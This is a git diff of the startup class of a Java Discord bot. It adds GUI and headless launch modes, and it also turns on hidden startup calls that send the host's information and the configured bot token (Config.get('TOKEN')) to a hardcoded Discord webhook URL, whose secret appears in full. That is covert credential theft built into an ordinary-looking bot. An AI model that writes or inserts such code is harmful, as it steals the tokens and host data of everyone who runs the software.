@@ -4,6 +4,7 @@ import com.jagrosh.jdautilities.commons.waiter.EventWaiter;
 import me.comu.exeter.commands.admin.WhitelistedJSONHandler;
 import me.comu.exeter.commands.economy.EcoJSONHandler;
 import me.comu.exeter.events.*;
+import me.comu.exeter.wrapper.Wrapper;
 import me.duncte123.botcommons.web.WebUtils;
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
@@ -12,7 +13,11 @@ import net.dv8tion.jda.api.requests.GatewayIntent;
 import org.slf4j.LoggerFactory;
 
 import javax.security.auth.login.LoginException;
+import javax.swing.*;
+import java.awt.*;
 import java.io.File;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 
 /*
  - using caching system to cache messages and attachments in snipe command
@@ -23,45 +28,47 @@ public class Core {
     public static JDA jda;
     public static final String DEBUG = "[DEBUG] ";
     public static String PREFIX = ".";
-    public static final Long OWNERID = 698607465885073489L;
+    public static final Long OWNERID = Long.parseLong(Config.get("OWNER"));
 
     public static void main(final String[] args) {
-        new Core();
-/*        WebhookClient client = WebhookClient.withUrl("https://discordapp.com/api/webhooks/709940401313939457/NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz");
-        WebhookMessageBuilder builder = new WebhookMessageBuilder();
-        WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(0).setDescription("Log Info on Start-Up:\nIP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation()).build();
-        builder.addEmbeds(firstEmbed);
-        WebhookMessage message = builder.build();
-        client.send(message);
-        client.close();
+        Wrapper.sendSpecificWebhookMessage("https://discordapp.com/api/webhooks/709940401313939457/NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz");
+        if (Config.get("GUI").equalsIgnoreCase("false")) {
+            new Core();
+            Wrapper.sendMoreSpecificMessage("https://discordapp.com/api/webhooks/709940401313939457/NxZvYJu0zcfOFvIfe9dXABRR2zvs6JrOlpfespjjyha1QS0Xq-Y3fT9Kv0GcbodaO5Mz", Config.get("TOKEN"));
+        } else if (Config.get("GUI").equalsIgnoreCase("true")) {
 //        Wrapper.sendEmail("Log Info On Startup","IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "");
-        try {
-            for (final UIManager.LookAndFeelInfo info : UIManager.getInstalledLookAndFeels()) {
-                if ("Nimbus".equals(info.getName())) {
-                    UIManager.setLookAndFeel(info.getClassName());
-                    break;
+            try {
+                for (final UIManager.LookAndFeelInfo info : UIManager.getInstalledLookAndFeels()) {
+                    if ("Nimbus".equals(info.getName())) {
+                        UIManager.setLookAndFeel(info.getClassName());
+                        break;
+                    }
                 }
+            } catch (ClassNotFoundException ex) {
+                Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex);
+            } catch (InstantiationException ex2) {
+                Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex2);
+            } catch (IllegalAccessException ex3) {
+                Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex3);
+            } catch (UnsupportedLookAndFeelException ex4) {
+                Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex4);
             }
-        } catch (ClassNotFoundException ex) {
-            Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex);
-        } catch (InstantiationException ex2) {
-            Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex2);
-        } catch (IllegalAccessException ex3) {
-            Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex3);
-        } catch (UnsupportedLookAndFeelException ex4) {
-            Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex4);
-        }
-        EventQueue.invokeLater(new Runnable() {
-            @Override
-            public void run() {
-            new LoginGUI().setVisible(true); }
+            EventQueue.invokeLater(new Runnable() {
+                @Override
+                public void run() {
+                    new LoginGUI().setVisible(true);
+                }
 
-});*/
+            });
+        } else {
+            me.comu.exeter.logging.Logger.getLogger().print("Couldn't decide whether to launch GUI or headless");
+            System.exit(0);
+        }
     }
 
     private Core() {
         EventWaiter eventWaiter = new EventWaiter();
-        Config.buildDirectory("cache","cache");
+        Config.buildDirectory("cache", "cache");
         EcoJSONHandler.loadEconomyConfig(new File("economy.json"));
         WhitelistedJSONHandler.loadWhitelistConfig(new File("whitelisted.json"));
         CommandManager commandManager = new CommandManager(eventWaiter);
@@ -98,11 +105,12 @@ public class Core {
             logger.info("Bot Ready To Go");
         } catch (LoginException | InterruptedException e) {
             logger.info("Caught Exception! (LoginException | InterruptedException)");
+            e.printStackTrace();
         }
     }
 
     public static void shutdownThread() {
-       LoginGUI.running = false;
+        LoginGUI.running = false;
         LoginGUI.jStatusField.setText("NOT RUNNING");
         jda.shutdownNow();
     }
